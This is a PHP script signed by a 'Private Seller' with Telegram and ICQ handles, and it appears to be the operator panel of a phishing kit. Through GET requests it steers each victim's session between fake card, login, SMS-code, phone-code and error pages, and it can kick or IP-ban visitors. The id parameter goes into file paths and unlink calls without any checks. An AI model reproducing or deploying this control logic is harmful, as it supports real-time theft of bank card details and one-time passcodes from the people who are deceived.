<?php
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/

function create_sure($path){
	do{
	$op = fopen($path,'w');
	fwrite($op,"");
	fclose($op);
		
	}while(!file_exists($path));
	
}


function create_result($path,$res){
	$op = fopen($path,'w');
	fwrite($op,$res);
	fclose($op);
	
}





if(isset($_GET['page'])){
	$id = $_GET['id'];
	$path = "../data/await/$id.page";
	if($_GET['page'] == "carde"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "CARD_ERROR_PAGE";
	}
	else if($_GET['page'] == "card"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "CARD_PAGE";
	}
	else if($_GET['page'] == "login"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "LOGIN_PAGE";
	}else if($_GET['page'] == "nofitication"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "NOFITICATION_PAGE";
	}
	else if($_GET['page'] == "smserror"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "SMS_ERROR_PAGE";
	}
	else if($_GET['page'] == "sms"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "SMS_PAGE";
	}
	else if($_GET['page'] == "tel"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "Tel_CODE_PAGE";
	}
	else if($_GET['page'] == "done"){
		create_sure($path);
		create_result($path,$_GET['page']);
		echo "DONE_PAGE";
	}else{
		
	}

}





// bot operations
if(isset($_GET['kick'])){
	
	$id = $_GET['id'];
	$path = "../data/await/$id.kick";
	create_sure($path);
	
	echo "KICKED";
	
}
else if(isset($_GET['ban'])){
	$ip = $_GET['ip'];
	$id = $_GET['id'];

	$result = "../data/ban.txt";
	$op = fopen($result,'a+');
	fwrite($op,"$ip\n");
	fclose($op);
	
	unlink("../data/await/$id");
	
	echo "BANNED - $ip";
	
	
}
else{
	
}






?>